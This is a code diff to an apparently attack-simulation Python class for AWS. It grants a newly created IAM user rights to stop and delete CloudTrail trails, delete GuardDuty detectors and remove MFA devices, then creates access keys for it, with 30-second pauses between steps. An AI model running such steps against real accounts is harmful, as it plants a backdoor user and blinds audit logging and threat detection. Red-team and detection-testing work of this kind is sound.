@@ -5,6 +5,7 @@ import subprocess
 import base64
 import os
 import configparser
+from Functions import attack_execution_duration
 
 
 
@@ -266,6 +267,21 @@ class Attack:
                                 "Effect": "Allow",
                                 "Action": "cloudtrail:StopLogging",
                                 "Resource": "arn:aws:cloudtrail:*:*:trail/*"
+                            },
+                            {
+                                "Effect": "Allow",
+                                "Action": ["iam:DeactivateMFADevice", "iam:DeleteVirtualMFADevice"],
+                                "Resource": "*"
+                            }, 
+                            {
+                                "Effect": "Allow",
+                                "Action": "guardduty:DeleteDetector",
+                                "Resource": "arn:aws:guardduty:*:*:detector/*"
+                            },
+                            {
+                                "Effect": "Allow",
+                                "Action": "cloudtrail:DeleteTrail",
+                                "Resource": "arn:aws:cloudtrail:*:*:trail/*"
                             }
                         ]
                     })
@@ -295,22 +311,28 @@ class Attack:
             if not user:
                 return None
     
+            attack_execution_duration(seconds=30, description="Create run_while_u_can & wait 30 Seconds") 
+
+
             # Attach managed & inline policies BEFORE creating access keys
             self.attach_policies(username, policy_arns)
+            attack_execution_duration(seconds=30, description="Attach inline policies for run_while_u_can & wait 30 Seconds")
+
+
             self.attach_inline_policy(username)
+            attack_execution_duration(seconds=30, description="Attach Management policies for run_while_u_can & wait 30 Seconds")
     
             access_keys = self.create_access_keys(username)
             if not access_keys:
                 return None
-    
+
+            attack_execution_duration(seconds=30, description="create access keys for run_while_u_can & wait 30 Seconds")    
             # Completely clear old AWS credentials
             print("🧹 Clearing previous AWS session...")
             os.environ.pop("AWS_SESSION_TOKEN", None)
             os.environ.pop("AWS_ACCESS_KEY_ID", None)
             os.environ.pop("AWS_SECRET_ACCESS_KEY", None)
     
-            # Wait for AWS to register the new keys
-            time.sleep(5)
     
             # Create a new isolated session
 
